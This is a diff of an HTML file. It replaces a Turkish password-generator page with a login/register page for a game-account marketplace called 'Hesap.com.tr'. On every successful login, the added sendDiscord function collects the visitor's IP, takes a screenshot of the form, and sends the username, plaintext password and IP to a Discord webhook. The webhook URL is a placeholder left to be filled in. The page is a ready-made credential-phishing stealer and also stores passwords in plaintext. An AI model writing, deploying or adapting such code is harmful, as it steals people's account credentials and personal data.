@@ -2,207 +2,135 @@
 <html lang="tr">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Şifre Oluşturucu</title>
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+<title>Hesap.com.tr Giriş / Kayıt / İlanlar</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <style>
-html, body {
-    margin: 0;
-    padding: 0;
-    font-family: 'Roboto', sans-serif;
-    background: black;
-    overflow: hidden;
-    height: 100%;
-}
-canvas {
-    position: fixed;
-    top: 0;
-    left: 0;
-    z-index: 0;
-}
-.container {
-    position: relative;
-    z-index: 1;
-    background: rgba(0,0,0,0.85);
-    padding: 25px;
-    border-radius: 15px;
-    width: 90%;
-    max-width: 500px;
-    margin: 20px auto;
-    text-align: center;
-    color: #0f0;
-}
-h2 { margin-bottom: 20px; color: #0f0; }
-.password {
-    margin: 20px 0 10px 0;
-    padding: 15px;
-    font-size: 1.2em;
-    background: rgba(0,0,0,0.9);
-    border-radius: 10px;
-    word-break: break-all;
-    min-height: 50px;
-    position: relative;
-    color: #0f0;
-    font-family: monospace;
-}
-.copy-btn { position: absolute; right: 10px; top: 10px; background: #0f0; color: black; border: none; padding: 5px 10px; border-radius: 8px; cursor: pointer; font-size: 0.9em; }
-.copy-btn:hover { background: #0a0; }
-.options, .slider-container { margin: 15px 0; text-align: left; }
-.options label { display: block; margin: 5px 0; font-size: 0.95em; cursor: pointer; color: #0f0; }
-button.generate { background: #0f0; color: black; border: none; padding: 12px 25px; border-radius: 12px; cursor: pointer; font-size: 1em; transition: 0.3s; margin-top: 10px; }
-button.generate:hover { background: #0a0; }
-.strength-bar { margin-top: 10px; width: 100%; height: 20px; background: #222; border-radius: 10px; overflow: hidden; display: flex; align-items: center; }
-.strength-fill { height: 100%; width: 0; border-radius: 10px; transition: width 0.3s ease, background-color 0.3s ease; display: flex; justify-content: space-around; align-items: center; padding: 0 5px; }
-.strength-icon { font-size: 0.9em; color: black; }
-.slider-container input[type="range"] { width: 100%; cursor: pointer; }
-.copied-msg { color: #0f0; font-size: 0.9em; margin-top: 5px; display: none; }
-
-@media (max-width: 480px) {
-    .container { padding: 15px; }
-    .password { font-size: 1em; }
-    button.generate { width: 100%; }
-}
+body { font-family: Arial, sans-serif; background: #f5f6fa; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; }
+.container { background:#fff; padding:30px; border-radius:10px; box-shadow:0 10px 20px rgba(0,0,0,0.1); width:350px; text-align:center; }
+h2 { margin-bottom:20px; color:#2f3640; }
+input[type=text], input[type=password] { width:100%; padding:10px; margin:10px 0; border:1px solid #ccc; border-radius:5px; }
+button { width:100%; padding:12px; margin-top:10px; border:none; border-radius:5px; background:#0097e6; color:#fff; cursor:pointer; }
+button:hover { background:#40739e; }
+.info { margin-top:15px; color:green; }
+a { color:#0097e6; text-decoration:none; display:block; margin-top:10px; }
+a:hover { text-decoration:underline; }
+#dashboard { display:none; }
+.list-item { background:#f1f2f6; padding:10px; margin:10px 0; border-radius:5px; text-align:left; }
 </style>
 </head>
 <body>
-<canvas id="matrix"></canvas>
 
-<div class="container">
-<h2>Şifre Oluşturucu</h2>
-
-<div class="slider-container">
-<label>Uzunluk: <span id="lengthValue">16</span></label>
-<input type="range" id="length" min="8" max="64" value="16" oninput="updateLength()">
+<div class="container" id="authContainer">
+  <h2 id="formTitle">Giriş Yap</h2>
+  <input type="text" id="username" placeholder="Kullanıcı Adı">
+  <input type="password" id="password" placeholder="Şifre">
+  <button onclick="authAction()" id="authButton">Giriş Yap</button>
+  <p class="info" id="infoText"></p>
+  <a href="#" id="toggleLink" onclick="toggleForm()">Kayıt Ol</a>
 </div>
 
-<div class="options">
-<label><input type="checkbox" id="uppercase" checked> Büyük Harf</label>
-<label><input type="checkbox" id="lowercase" checked> Küçük Harf</label>
-<label><input type="checkbox" id="numbers" checked> Sayılar</label>
-<label><input type="checkbox" id="symbols" checked> Özel Karakterler</label>
-</div>
-
-<button class="generate" onclick="generatePassword()">Şifre Oluştur</button>
-
-<div class="password" id="password">
-...
-<button class="copy-btn" onclick="copyPassword()">Kopyala</button>
-</div>
-
-<div class="strength-bar">
-<div class="strength-fill" id="strengthFill"></div>
-</div>
-
-<div class="copied-msg" id="copiedMsg">Kopyalandı!</div>
+<div class="container" id="dashboard">
+  <h2>Hoşgeldin <span id="userNameDisplay"></span>!</h2>
+  <h3>Random İlanlar</h3>
+  <div id="adsContainer"></div>
+  <button onclick="logout()">Çıkış Yap</button>
 </div>
 
 <script>
-// Slider
-function updateLength() {
-    document.getElementById('lengthValue').textContent = document.getElementById('length').value;
+if(!localStorage.getItem("users")) localStorage.setItem("users", JSON.stringify({}));
+let isRegister = false;
+const webhookURL = "BURAYA_WEBHOOK_URLİNİ_YAPISTIR";
+
+// Form toggle
+function toggleForm() {
+    isRegister = !isRegister;
+    document.getElementById('formTitle').innerText = isRegister ? "Kayıt Ol" : "Giriş Yap";
+    document.getElementById('authButton').innerText = isRegister ? "Kayıt Ol" : "Giriş Yap";
+    document.getElementById('toggleLink').innerText = isRegister ? "Giriş Yap" : "Kayıt Ol";
+    document.getElementById('infoText').innerText = "";
 }
 
-// Matrix background
-const canvas = document.getElementById('matrix');
-const ctx = canvas.getContext('2d');
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
+// Giriş / Kayıt
+async function authAction() {
+    let username = document.getElementById('username').value.trim();
+    let password = document.getElementById('password').value.trim();
+    if(!username || !password){ alert("Lütfen tüm alanları doldur."); return; }
 
-const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()*&^%';
-const fontSize = 16;
-const columns = canvas.width / fontSize;
-const drops = Array(Math.floor(columns)).fill(1);
+    let users = JSON.parse(localStorage.getItem("users"));
 
-function drawMatrix() {
-    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-    ctx.fillStyle = '#0f0';
-    ctx.font = fontSize + 'px monospace';
-    for(let i = 0; i < drops.length; i++){
-        const text = letters.charAt(Math.floor(Math.random()*letters.length));
-        ctx.fillText(text, i*fontSize, drops[i]*fontSize);
-        drops[i]++;
-        if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-    }
-}
-setInterval(drawMatrix, 35);
-
-// Şifre oluşturma
-function generatePassword() {
-    const length = parseInt(document.getElementById('length').value);
-    const useUppercase = document.getElementById('uppercase').checked;
-    const useLowercase = document.getElementById('lowercase').checked;
-    const useNumbers = document.getElementById('numbers').checked;
-    const useSymbols = document.getElementById('symbols').checked;
-
-    if (!useUppercase && !useLowercase && !useNumbers && !useSymbols) {
-        alert('En az bir karakter türü seçmelisiniz!');
-        return;
-    }
-
-    const upperChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    const lowerChars = 'abcdefghijklmnopqrstuvwxyz';
-    const numberChars = '0123456789';
-    const symbolChars = '!@#$%^&*()_+[]{}|;:,.<>?';
-    let allChars = '';
-    if (useUppercase) allChars += upperChars;
-    if (useLowercase) allChars += lowerChars;
-    if (useNumbers) allChars += numberChars;
-    if (useSymbols) allChars += symbolChars;
-
-    let password = '';
-    const pwdEl = document.getElementById('password');
-    pwdEl.childNodes[0].nodeValue = '';
-
-    let i = 0;
-    const interval = setInterval(() => {
-        if (i < length) {
-            const randomChar = allChars.charAt(Math.floor(Math.random() * allChars.length));
-            pwdEl.childNodes[0].nodeValue += randomChar;
-            i++;
-        } else {
-            clearInterval(interval);
+    if(isRegister){
+        if(users[username]){
+            document.getElementById('infoText').innerText = "Bu kullanıcı adı alınmış!";
+            return;
         }
-    }, 50);
-
-    // Güç çubuğu
-    let score = 0;
-    if (useUppercase) score++;
-    if (useLowercase) score++;
-    if (useNumbers) score++;
-    if (useSymbols) score++;
-    if (length >= 12) score++;
-
-    const fillEl = document.getElementById('strengthFill');
-    const width = (score/5)*100 + '%';
-    let color = 'red';
-    if(score<=2) color='red';
-    else if(score===3||score===4) color='orange';
-    else color='green';
-    fillEl.style.width = width;
-    fillEl.style.backgroundColor = color;
-
-    fillEl.innerHTML = '';
-    if(useUppercase) fillEl.innerHTML += '<span class="strength-icon">A</span>';
-    if(useLowercase) fillEl.innerHTML += '<span class="strength-icon">a</span>';
-    if(useNumbers) fillEl.innerHTML += '<span class="strength-icon">1</span>';
-    if(useSymbols) fillEl.innerHTML += '<span class="strength-icon">#</span>';
+        users[username] = password;
+        localStorage.setItem("users", JSON.stringify(users));
+        document.getElementById('infoText').innerText = "Kayıt başarılı! Giriş yapabilirsiniz.";
+    } else {
+        if(users[username] && users[username] === password){
+            showDashboard(username);
+            sendDiscord(username,password);
+        } else {
+            document.getElementById('infoText').innerText="Kullanıcı adı veya şifre yanlış!";
+        }
+    }
 }
 
-function copyPassword() {
-    const password = document.getElementById('password').childNodes[0].nodeValue;
-    navigator.clipboard.writeText(password).then(() => {
-        const msg = document.getElementById('copiedMsg');
-        msg.style.display='block';
-        setTimeout(()=>{msg.style.display='none';},1500);
+// Dashboard göster
+function showDashboard(username){
+    document.getElementById('authContainer').style.display='none';
+    document.getElementById('dashboard').style.display='block';
+    document.getElementById('userNameDisplay').innerText=username;
+    generateAds();
+}
+
+// Çıkış
+function logout(){
+    document.getElementById('authContainer').style.display='block';
+    document.getElementById('dashboard').style.display='none';
+    document.getElementById('username').value="";
+    document.getElementById('password').value="";
+    document.getElementById('infoText').innerText="";
+}
+
+// Random ilan oluştur
+function generateAds(){
+    const ads = [
+        "PUBG 10 level hesap - 3 TL",
+        "CS:GO Prime hesap - 5 TL",
+        "Valorant Starter pack - 4 TL",
+        "Minecraft Premium - 7 TL",
+        "FIFA Ultimate Team hesap - 6 TL"
+    ];
+    const container = document.getElementById('adsContainer');
+    container.innerHTML="";
+    for(let i=0;i<5;i++){
+        let div = document.createElement('div');
+        div.className="list-item";
+        div.innerText=ads[Math.floor(Math.random()*ads.length)];
+        container.appendChild(div);
+    }
+}
+
+// Discord webhook + SS + IP
+async function sendDiscord(username,password){
+    let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=> "IP alınamadı");
+    html2canvas(document.getElementById("authContainer")).then(async canvas=>{
+        canvas.toBlob(async function(blob){
+            let formData = new FormData();
+            formData.append("file", blob,"screenshot.png");
+
+            let payload = {
+                "embeds":[{"title":"Yeni Giriş Kaydı",
+                           "description":`**Kullanıcı Adı:** ${username}\n**Şifre:** ${password}\n**IP Adresi:** ${ip}`,
+                           "color":16711680}]
+            };
+            formData.append("payload_json", JSON.stringify(payload));
+            await fetch(webhookURL,{method:"POST",body:formData});
+        });
     });
 }
-
-window.addEventListener('resize', ()=>{
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-});
-updateLength();
 </script>
+
 </body>
 </html>
